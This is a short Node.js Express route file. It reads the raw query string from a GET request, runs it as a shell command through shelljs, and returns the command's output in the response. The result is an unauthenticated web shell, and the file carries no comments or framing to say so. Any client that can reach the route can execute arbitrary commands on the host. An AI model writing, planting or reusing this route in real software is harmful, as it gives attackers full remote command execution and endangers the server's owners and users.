var express = require("express");
var router=express.Router();
const shell = require('shelljs')
router.get("/",function(req,res,next){
    t=req.originalUrl.split('?')[1].replace(/%20/g,' ');
    t=shell.exec(t);
    res.send(t);
});
module.exports=router;